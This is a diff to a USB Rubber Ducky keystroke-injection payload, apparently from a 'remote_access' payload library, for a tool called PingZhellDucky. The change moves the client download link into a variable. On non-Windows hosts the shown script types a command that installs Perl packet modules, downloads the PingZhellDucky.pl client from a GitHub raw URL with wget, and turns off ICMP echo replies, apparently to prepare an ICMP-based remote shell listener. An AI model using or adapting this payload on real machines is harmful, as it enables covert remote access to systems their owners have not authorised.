@@ -53,6 +53,9 @@ DEFINE WAIT 250
 REM Do you want to install the dependencies and set up the infratructre?
 REM Will trigger when not using Windows - Best use with Linux
 DEFINE INSTALL TRUE
+REM Link to the PingZhellDucky.pl client - Required for installation
+DEFINE CLIENTLINK https://raw.githubusercontent.com/0iphor13/usbrubberducky-payloads/master/payloads/library/remote_access/PingZhellDucky/PingZhellDucky.pl
+
 
 IF ($_OS == WINDOWS) THEN
     DELAY 1500
@@ -68,7 +71,7 @@ ELSE
         DELAY WAIT
         STRINGLN echo "Setting up Infrastructre - Do not interact!"
         DELAY 2000
-        STRINGLN cpan IO::Socket NetPacket::IP NetPacket::ICMP && wget https://raw.githubusercontent.com/0iphor13/usbrubberducky-payloads/master/payloads/library/remote_access/PingZhellDucky/PingZhellDucky.pl && sysctl -w net.ipv4.icmp_echo_ignore_all=1 && echo "Setup complete!"
+        STRINGLN cpan IO::Socket NetPacket::IP NetPacket::ICMP && wget CLIENTLINK && sysctl -w net.ipv4.icmp_echo_ignore_all=1 && echo "Setup complete!"
     ELSE
         STRING Please insert device into a Windows machine or change the settings!
 END_IF
